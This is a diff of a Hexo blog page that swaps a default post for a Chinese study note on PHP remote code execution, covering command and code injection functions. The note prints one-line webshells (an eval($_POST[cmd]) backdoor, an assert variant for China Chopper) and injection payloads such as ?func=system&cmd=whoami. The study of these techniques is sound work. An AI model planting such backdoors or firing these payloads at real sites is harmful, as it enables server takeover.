@@ -6,7 +6,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    Hello World |  w&#39; Blog
+    RCE |  w&#39; Blog
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -22,6 +22,7 @@
 
   
 
+<link rel="alternate" href="/atom.xml" title="w' Blog" type="application/atom+xml">
 </head>
 
 </html>
@@ -30,7 +31,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-hello-world" class="article article-type-post" itemscope
+  <article id="post-RCE" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -38,7 +39,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Hello World
+  RCE
 </h1>
   
 
@@ -47,10 +48,14 @@
 
     
     <div class="article-meta">
-      <a href="/2020/03/12/hello-world/" class="article-date">
-  <time datetime="2020-03-12T08:13:38.308Z" itemprop="datePublished">2020-03-12</time>
+      <a href="/2020/03/12/RCE/" class="article-date">
+  <time datetime="2020-03-12T13:38:48.000Z" itemprop="datePublished">2020-03-12</time>
 </a>
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a>
+  </div>
+
       
       
 <div class="word_count">
@@ -58,7 +63,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">73字</span>
+            <span class="post-count">466字</span>
         </span>
     </span>
 
@@ -67,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">2分钟</span>
         </span>
     </span>
 </div>
@@ -94,19 +99,51 @@
       
 
       
-      <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+      <h1 id="RCE：命令执行漏洞"><a href="#RCE：命令执行漏洞" class="headerlink" title="RCE：命令执行漏洞"></a>RCE：命令执行漏洞</h1><h2 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h2><ul>
+<li>系统命令执行函数引用了用户可控变量且未进行过滤,注入恶意系统命令，可以使用命令连接符：|，||，&amp;，&amp;&amp;</li>
+<li>常见函数：<pre><code>php中的 `exec(),system(),passthru(),shell_exec()...`</code></pre></li>
+</ul>
+<hr>
+<h2 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h2><ul>
+<li><p>代码注入函数引用了用户可控变量且未进行过滤，注入恶意脚本代码，常用的一句话木马就是人为生产的代码注入漏洞</p>
+</li>
+<li><p>常见函数</p>
+<pre><code>php中的 `assert(),eval(),preg_replace(),create_function(),array_map(),call_user_func(),call_user_func_array()...`</code></pre><ul>
+<li><p>案例1</p>
+<p>  <code>eval()</code>函数:将字符串作为php代码执行，常见的一句话木马：<code>&lt;?php eval($_POST[cmd]);?&gt;</code>cmd就是一句话木马的密码。</p>
+</li>
+<li><p>案例2</p>
+<p>  <code>assert()</code>动态函数，<code>php代码：&lt;?php
+  $_GET[0]($_REQUEST[1]);
+  ?&gt;,  payload:?0=assert&amp;1=phpinfo()</code>,此处assert不可替换成eval,因为assert是动态函数，其中菜刀连接的链接为<code>http://ip/RCE/index.php?0=assert</code>,密码为 <code>1</code></p>
+</li>
+<li><p>案例3</p>
+<p>  <code>preg_replace()</code>执行一个正则表达式的搜索和替换，如果正则表达式中有e修正符，则第二个参数的字符串当作php代码执行<code>&lt;?php echo preg_replace(&quot;/test/e&quot;,$_POST[cmd],&quot;something test&quot;);?&gt;</code><br>  cmd就是一句话木马的密码。</p>
+</li>
+<li><p>案例4 </p>
+<p>  <code>creat_function()</code><br>  php代码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$code &#x3D; $_REQUEST[cmd];</span><br><span class="line">$str &#x3D; &#39;echo test&#39;.$code.&quot;;&quot;;</span><br><span class="line">$x&#x3D;create_function(&#39;$code&#39;,$str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>  payload:<code>http://ip/RCE/index.php?cmd=1;}phpinfo();/*</code>注意闭合<code>creat_function()</code>函数</p>
+</li>
+<li><p>案例5</p>
+<p>  <code>array_map()</code><br>  php代码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">$arr[0]&#x3D;$eval_cmd;</span><br><span class="line">$new_arr &#x3D; array_map($eval_func,$arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
+</li>
+<li><p>案例6</p>
+<p>  <code>call_user_func()</code><br>  php代码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func($eval_func,$eval_cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
+</li>
+<li><p>案例7</p>
+<p>  <code>call_user_func_array()</code><br>  php代码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func_array($eval_func,array($eval_cmd));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
 
       
       <!-- reward -->
@@ -176,13 +213,15 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/12/hello-world/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/12/RCE/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
 
     </footer>
 
@@ -190,20 +229,6 @@
 
   
   
-  <nav class="article-nav">
-    
-      <a href="/2020/03/12/%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            个人信息
-          
-        </div>
-      </a>
-    
-    
-  </nav>
-
 
   
 
@@ -272,7 +297,7 @@
     <ul class="list-inline">
       <li>
         &copy;
-        2015-2020
+        2020
         w
       </li>
       <li>
@@ -315,7 +340,7 @@
 <nav class="navbar">
   
   <div class="logo">
-    <a href="/"><img src="/images/ayer-side.svg" alt="w&#39; Blog"></a>
+    <a href="/"><img src="/images/logo.png" alt="w&#39; Blog"></a>
   </div>
   
   <ul class="nav nav-main">
@@ -337,15 +362,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">摄影</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/2019/about">关于我</a>
+      <a class="nav-item-link" href="/about">关于我</a>
     </li>
     
   </ul>
@@ -358,10 +375,6 @@
         <i class="ri-search-line"></i>
       </a>
       
-      
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="ri-rss-line"></i>
-      </a>
       
     </li>
   </ul>
@@ -378,17 +391,17 @@
 <!-- #reward -->
 <div id="reward">
   <span class="close"><i class="ri-close-line"></i></span>
-  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <p class="reward-p"><i class="ri-cup-line"></i>在?请我喝杯咖啡?</p>
   <div class="reward-box">
     
     <div class="reward-item">
-      <img class="reward-img" src="/images/alipay.jpg">
+      <img class="reward-img" src="/images/alipay1.png">
       <span class="reward-type">支付宝</span>
     </div>
     
     
     <div class="reward-item">
-      <img class="reward-img" src="/images/wechat.jpg">
+      <img class="reward-img" src="/images/wechat2.png">
       <span class="reward-type">微信</span>
     </div>
     
@@ -576,6 +589,23 @@
 <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
 
 
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=492390949&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
     
   </div>
 </body>
